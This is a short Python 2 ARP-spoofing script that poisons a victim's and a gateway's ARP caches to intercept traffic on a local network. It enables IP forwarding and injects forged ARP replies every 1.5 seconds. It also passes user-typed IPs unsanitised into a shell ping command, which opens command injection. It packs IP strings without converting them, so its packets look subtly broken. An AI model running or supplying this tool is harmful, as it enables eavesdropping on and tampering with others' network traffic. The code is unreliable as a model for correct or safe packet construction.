import socket
import sys
import struct
import time
import binascii
import os
import subprocess
import netifaces
import re

#function to get mac of victim and gateway, arp injection could have been used too
#but this is easier, also scapy could have been used
#it gives a ping request and then picks the mac from arp table on local machine
def getmac(ip):
	response = os.system("ping -c 1 -w2 " + ip  + " > /dev/null 2>&1")
	if response==0:
		processId = subprocess.Popen(["arp", "-n", ip], stdout=subprocess.PIPE)
		s = processId.communicate()[0]
		mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
		mac=mac.replace(':','')
		return mac
	else:
		return 0
	
victimIp=raw_input("Please enter victim IP:")
gatewayIp=raw_input("Please enter Gateway IP:")

victimMac=binascii.unhexlify(getmac(victimIp))

gatewayMac=binascii.unhexlify(getmac(gatewayIp))

eth_address=netifaces.ifaddresses("eth0")
attackerIp=eth_address[2][0]['addr']
attackerMac=binascii.unhexlify(eth_address[17][0]['addr'].replace(':',''))

print "\n[*] Enabling IP Forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
rawsock=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0003))

rawsock.bind(('eth0',socket.htons(0x0800)))
#Injecting the arp request
while 1:
	#Spoofing as gateway and sending arp reply packet to victim
	arp_packet_toVictim=struct.pack("!6s6s2s2s2s1s1s2s6s4s6s4s",victimMac,
        attackerMac,"\x08\x06","\x00\x01","\x08\x00","\x06","\x04",\
        "\x00\x02", attackerMac,gatewayIp, victimMac, victimIp)

	#Spoofing as victim and sending arp reply packet to gateway
	arp_packet_toGateway=struct.pack("!6s6s2s2s2s1s1s2s6s4s6s4s",gatewayMac,
        attackerMac,"\x08\x06","\x00\x01","\x08\x00","\x06","\x04",\
        "\x00\x02", attackerMac,victimIp, gatewayMac, gatewayIp)
	
	print "Injecting ARP packets in interval of 1.5 seconds"
	rawsock.send(arp_packet_toVictim)
	rawsock.send(arp_packet_toGateway)

	time.sleep(1.5)
